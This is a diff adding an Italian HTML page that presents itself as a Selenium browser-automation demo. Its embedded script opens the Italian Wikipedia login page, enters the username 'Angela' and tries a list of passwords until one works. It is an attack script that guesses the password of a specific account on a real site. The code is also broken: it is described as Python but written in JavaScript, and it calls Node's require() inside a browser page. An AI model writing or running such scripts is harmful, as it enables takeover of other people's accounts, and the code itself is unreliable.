@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automazione del browser con Selenium</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: monospace;
+        }
+        h1 {
+            color: #00FF00; /* Colore verde */
+        }
+        p.comment {
+            background-color: black;
+            color: #FF00FF; /* Colore magenta */
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Automazione del browser con Selenium</h1>
+
+    <p class="comment">
+        Questo codice Python utilizza Selenium per automatizzare le operazioni del browser. Viene aperta la pagina principale di Wikipedia in italiano, effettuato il clic sul link di accesso, inserito un nome utente ("Angela") e iterato attraverso una lista di password per effettuare il login.
+    </p>
+
+    <script src="https://cdn.jsdelivr.net/npm/selenium-webdriver@4.0.0-beta.4/dist/selenium-webdriver.min.js"></script>
+    <script>
+        const webdriver = require('selenium-webdriver');
+        const By = webdriver.By;
+
+        const lista_parole = ["parola1", "parola2", "parola3", "parola4", "parola5", "parola6", "parola7", "parola8", "parola9", "parola10"];
+
+        async function automateBrowser() {
+            // Inizializza il driver del browser (per esempio, Chrome)
+            const driver = new webdriver.Builder().forBrowser('chrome').build();
+
+            // Apri la pagina web
+            const url = "https://it.wikipedia.org/wiki/Pagina_principale";
+            await driver.get(url);
+
+            // Effettua il clic sul link con l'ID "pt-login"
+            const login_link = await driver.findElement(By.id("pt-login"));
+            await login_link.click();
+
+            // Trova l'elemento del campo di input per il nome utente utilizzando l'ID
+            const username_field = await driver.findElement(By.id("wpName1"));
+            await username_field.sendKeys("Angela");
+
+            // Itera attraverso la lista delle password
+            for (let password of lista_parole) {
+                try {
+                    // Trova l'elemento del campo di input per la password utilizzando l'ID
+                    const password_field = await driver.findElement(By.id("wpPassword1"));
+                    await password_field.clear();
+                    await password_field.sendKeys(password);
+
+                    // Trova il pulsante di login utilizzando l'ID e fai clic su di esso
+                    const login_button = await driver.findElement(By.id("wpLoginAttempt"));
+                    await login_button.click();
+
+                    // Verifica se il login è riuscito
+                    if (await driver.getPageSource().includes("Benvenuto")) {
+                        console.log("Login riuscito con la password:", password);
+                        break;
+                    } else {
+                        console.log("Login fallito con la password:", password);
+                    }
+                } catch (error) {
+                    console.log("Si è verificato un errore durante il login con la password:", password);
+                }
+            }
+
+            // Chiudi il browser
+            await driver.quit();
+        }
+
+        automateBrowser().catch(console.error);
+    </script>
+</body>
+</html>
